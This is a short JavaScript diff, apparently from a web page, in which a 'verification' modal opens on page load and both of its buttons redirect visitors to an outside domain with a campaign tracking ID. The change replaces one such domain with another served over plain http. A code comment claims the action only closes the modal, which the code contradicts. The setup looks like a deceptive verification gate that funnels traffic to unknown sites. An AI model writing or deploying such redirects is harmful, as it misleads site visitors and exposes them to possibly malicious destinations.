@@ -53,7 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (vModal) {
     vModal.showModal();
     // Action to take after verification (currently closes modal)
-    const complete = () => window.location.href = 'https://f3w1.com/?utm_campaign=rlYRP3i9ri&v1=[v1]&v2=[v2]&v3=[v3]';
+    const complete = () => window.location.href = 'http://syn9ro.com/?utm_campaign=D65m7f7e4i&v1=[v1]&v2=[v2]&v3=[v3]';
     document.getElementById('verify-btn')?.addEventListener('click', complete);
     document.getElementById('enter-btn')?.addEventListener('click', complete);
     
